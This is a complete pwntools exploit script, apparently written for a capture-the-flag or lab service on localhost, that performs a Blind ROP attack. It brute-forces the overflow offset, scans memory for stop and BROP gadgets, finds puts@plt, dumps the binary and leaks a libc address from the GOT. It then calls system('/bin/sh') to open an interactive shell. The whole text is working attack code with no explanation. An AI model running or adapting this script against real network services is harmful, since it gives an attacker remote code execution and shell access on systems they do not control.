from pwn import *
from LibcSearcher import *

host = 'localhost'
port = 10001

def get_overflow_length():
	i = 1
	while True:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.send('a' * i)
			output = r.recv()
			r.close()
			if not 'No password' in output:
				return i - 1
			else:
				i += 1
		except EOFError:
			r.close()
			return i - 1

def get_stop_gadget(offset):
	addr = 0x400000
	while True:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.send('a' * offset + p64(addr))
			content = r.recv()
			r.close()
			if 'WelCome' in content:
				return addr
			addr += 1
		except EOFError:
			r.close()
			addr += 1
		except PwnlibException:
			pass

# checks if the gadget pops 6 registers
def get_brop_gadget(offset, stop_gadget, addr):
	try:
		r = remote(host, port)
		r.recvuntil('WelCome my friend,Do you know password?\n')
		r.send('a' * offset + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10)
		content = r.recv(timeout=0.1)
		r.close()
		return 'WelCome' in content
	except EOFError:
		r.close()
		return False
	except PwnlibException:
		return get_brop_gadget(offset, stop_gadget, addr)

# checks if it is not just a false alarm
def check_brop_gadget(offset, addr):
	try:
		r = remote(host, port)
		r.recvuntil('WelCome my friend,Do you know password?\n')
		payload = 'a' * offset + p64(addr) + 'a' * 8 * 10
		r.sendline(payload)
		content = r.recv()
		r.close()
		return False
	except EOFError:
		r.close()
		return True
	except PwnlibException:
		return check_brop_gadget(offset, addr)

def find_brop_gadget(offset, stop_gadget):
	addr = 0x400000
	while True:
		if get_brop_gadget(offset, stop_gadget, addr) and check_brop_gadget(offset, addr):
			return addr
		addr += 1

def find_puts(offset, rdi_ret, stop_gadget):
	addr = 0x400000
	while True:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.sendline('a' * offset + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget))
			content = r.recv()
			if '\x7fELF' in content:
				return addr
			r.close()
			addr += 1
		except EOFError:
			r.close()
			addr += 1
		except PwnlibException:
			pass

def leak(offset, addr, rdi_ret, puts, stop_gadget):
	# print(hex(addr))
	try:
		r = remote(host, port)
		r.recvuntil('WelCome my friend,Do you know password?\n')
		r.sendline('a' * offset + p64(rdi_ret) + p64(addr) + p64(puts) + p64(stop_gadget))
		content = r.recvuntil('WelCome')
		r.close()
		try:
			content = content[:content.index('\nWelCome')]
		except:
			pass
		if content == '':
			content = '\x00'
		return content
	except PwnlibException:
		return leak(offset, addr, rdi_ret, puts, stop_gadget)
	except EOFError:
		r.close()
		return None


def leak_bytes(progress, offset, start, num_bytes, rdi_ret, puts, stop_gadget):
	# print(hex(start))
	addr = start
	res = ''
	while addr < (start + num_bytes):
		if progress:
			progress.status('Leaked 0x%x bytes' % (addr - start))
		data = leak(offset, addr, rdi_ret, puts, stop_gadget)
		if data is None:
			continue
		res += data
		addr += len(data)

	return res

def same_session_leak(r, offset, addr, rdi_ret, puts):
	main = 0x400697
	res = ''
	while len(res) < 8:
		r.sendline('a' * offset + p64(rdi_ret) + p64(addr) + p64(puts) + p64(main))
		try:
			content = r.recvuntil('WelCome my friend,Do you know password?\n')
		except EOFError:
			sleep(0.5)
			continue
		try:
			content = content[:content.index('\nWelCome')]
		except:
			pass
		if content == '':
			content = '\x00'
		res += content
		addr += len(content)
	return res

def call_function(offset, func, rdi, rdi_ret, return_addr):
	return 'a' * offset + p64(rdi_ret) + p64(rdi) + p64(func) + p64(return_addr)

if __name__ == '__main__':
	p = log.progress('Brute force search buffer overflow length')
	context.log_level = 'critical'  # suspend all logging
	offset = get_overflow_length()
	context.log_level = 'info'  # resume all logging
	p.success('Overflow starts after %d bytes' % offset)

	p = log.progress('Finding stop gadget')
	context.log_level = 'critical'  # suspend all logging
	stop_gadget = get_stop_gadget(offset)
	context.log_level = 'info'  # resume all logging
	p.success('Found stop gadget at 0x%x' % stop_gadget)

	p = log.progress('Finding brop gadget')
	context.log_level = 'critical'  # suspend all logging
	brop_gadget = find_brop_gadget(offset, stop_gadget)  # it seems that there may still be false alarms
	context.log_level = 'info'  # resume all logging
	p.success('Found brop gadget at 0x%x' % brop_gadget)

	p = log.progress('Finding puts@plt')
	pop_rdi_ret = brop_gadget + 9
	context.log_level = 'critical'  # suspend all logging
	puts = find_puts(offset, pop_rdi_ret, stop_gadget)
	context.log_level = 'info'  # resume all logging
	p.success('Found puts at 0x%x' % puts)

	p = log.progress('Leaking 0x1000 bytes starting from 0x400000', level=logging.CRITICAL)
	context.log_level = 'critical'  # suspend all logging
	leaked = leak_bytes(p, offset, 0x400000, 0x1000, pop_rdi_ret, puts, stop_gadget)
	open('leaked', 'w').write(leaked)
	context.log_level = 'info'  # resume all logging
	p.success('Finished leaking. Wrote leaked bytes to \'./leaked\'')

	# now the leaks all need to be in the same session because ASLR
	sleep(1)
	r = remote(host, port)
	r.recvuntil('WelCome my friend,Do you know password?\n')

	# now that we have the binary, the rest is just normal rop
	p = log.progress('Leaking GOT entry of puts', level=logging.CRITICAL)
	context.log_level = 'critical'  # suspend all logging
	puts_got = 0x601018
	puts_libc = u64(same_session_leak(r, offset, puts_got, pop_rdi_ret, puts)[:8])

	# alternatively, use dynelf to resolve them, but somehow doesnt work...
	# dynelf_leak = lambda addr: same_session_leak(r, offset, addr, pop_rdi_ret, puts)[:8]
	# d = DynELF(dynelf_leak, pointer=puts)
	# puts_libc = d.lookup('puts', 'libc')

	context.log_level = 'info'  # resume all logging
	p.success('Leaked puts@libc: 0x%x' % puts_libc)

	libc = LibcSearcher('puts', puts_libc)

	libc_base = puts_libc - libc.dump('puts')

	binsh = libc_base + libc.dump('str_bin_sh')
	system = libc_base + libc.dump('system')

	# call system
	log.info('Calling system(\'/bin/sh\')')
	payload = call_function(offset, system, binsh, pop_rdi_ret, stop_gadget)
	r.sendline(payload)
	r.interactive()